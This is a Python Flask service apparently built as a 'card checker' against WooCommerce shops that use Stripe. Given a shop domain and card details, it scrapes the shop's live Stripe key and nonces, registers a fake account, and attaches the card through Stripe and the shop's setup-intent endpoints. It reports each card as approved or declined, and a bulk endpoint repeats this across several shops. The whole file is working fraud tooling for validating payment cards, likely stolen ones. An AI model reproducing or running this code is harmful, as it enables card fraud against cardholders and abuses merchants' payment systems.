from flask import Flask, jsonify
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string

app = Flask(__name__)

def get_stripe_key(domain):
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]
    
    for url in urls_to_try:
        try:
            response = requests.get(url, headers={'User-Agent': UserAgent().random}, timeout=10)
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:                
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            return key_match.group(0)
        except:
            continue
    
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def extract_nonce_from_page(html_content, domain):
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    
    return None

def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password

def register_account(domain, session):
    try:        
        reg_response = session.get(f"https://{domain}/my-account/")
                
        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]
        
        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break
        
        if not reg_nonce:
            return False, "Could not extract registration nonce"
                
        username, email, password = generate_random_credentials()
        
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={'Referer': f'https://{domain}/my-account/'}
        )
        
        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
            return True, "Registration successful"
        else:
            return False, "Registration failed"
            
    except Exception as e:
        return False, f"Registration error: {str(e)}"

def process_card_enhanced(domain, ccx, use_registration=True):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    stripe_key = get_stripe_key(domain)

    if use_registration:
        registered, reg_message = register_account(domain, session)
        
    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    nonce = None
    for url in payment_urls:
        try:
            response = session.get(url, timeout=10)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except:
            continue
    
    if not nonce:
        return {"Response": "Failed to extract nonce from site", "Status": "Declined"}

    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Sahil Pro',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            return {"Response": error_msg, "Status": "Declined"}

        payment_method_id = pm_data['id']
    except Exception as e:
        return {"Response": f"Payment Method Creation Failed: {str(e)}", "Status": "Declined"}
    
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]
    
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15
                )
                                
                try:
                    setup_data = setup_response.json()
                except:
                    setup_data = {'raw_response': setup_response.text}
              
                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        return {"Response": "3D", "status": "Declined"}
                    elif data_status == 'succeeded':
                        return {"Response": "Card Added ", "Status": "Approved"}
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        return {"response": error_msg, "Status": "Declined"}

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {"response": error_msg, "Status": "Declined"}

                if setup_data.get('status') in ['succeeded', 'success']:
                    return {"Response": "Card Added", "status": "Approved"}

            except Exception as e:
                continue

    return {"Response": "All payment attempts failed", "status": "Declined"}

@app.route('/gateway=AutoStripe/key=<key>/site=<domain>/cc=<cc>')
def process_request(key, domain, cc):
    if key != "Aloo_Khaoge?":
        return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
    
    if not re.match(r'^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}$', domain):
        return jsonify({"error": "Invalid domain format", "status": "Bad Request"}), 400
        
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
    
    result = process_card_enhanced(domain, cc)
        
    return jsonify({
        "Response": result["response"],
        "Status": result["status"]
    })

@app.route('/gateway=AutoStripe/key=<key>/bulk/cc=<cc>')
def bulk_process_request(key, cc):
    if key != "Aloo_Khaoge?":
        return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
    
    test_domains = [
        "example-shop1.com",
        "example-store2.com", 
        "demo-woocommerce3.com"
    ]
    
    results = []
    for domain in test_domains:
        try:
            result = process_card_enhanced(domain, cc)
            results.append({
                "Domain": domain,
                "Response": result["response"],
                "Status": result["status"]
            })
        except Exception as e:
            results.append({
                "Domain": domain,
                "Response": f"Error: {str(e)}",
                "Status": "Error"
            })
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)